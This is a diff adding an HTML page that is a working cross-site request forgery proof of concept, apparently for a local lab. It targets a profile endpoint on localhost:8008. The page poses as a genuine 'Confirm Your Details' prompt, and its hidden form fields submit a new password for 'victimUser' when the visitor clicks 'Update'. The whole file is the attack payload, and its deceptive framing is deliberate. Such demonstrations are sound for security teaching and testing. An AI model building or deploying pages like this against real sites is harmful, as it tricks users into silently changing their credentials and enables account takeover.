@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+    <!-- Add any specific styles or links to stylesheets here -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        form {
+            margin-top: 20px;
+        }
+        button {
+            background-color: #4CAF50; /* Green */
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Confirm Your Details</h1>
+    <p>Please confirm your details and click "Update" to continue.</p>
+    <!-- This form mimics an attacker page, designed to look like a genuine part of the website -->
+    <form action="http://localhost:8008/profile" method="POST">
+        <input type="hidden" name="username" value="victimUser">
+        <input type="hidden" name="password" value="newpassword123">
+        <button type="submit">Update</button>
+    </form>
+</body>
+</html>
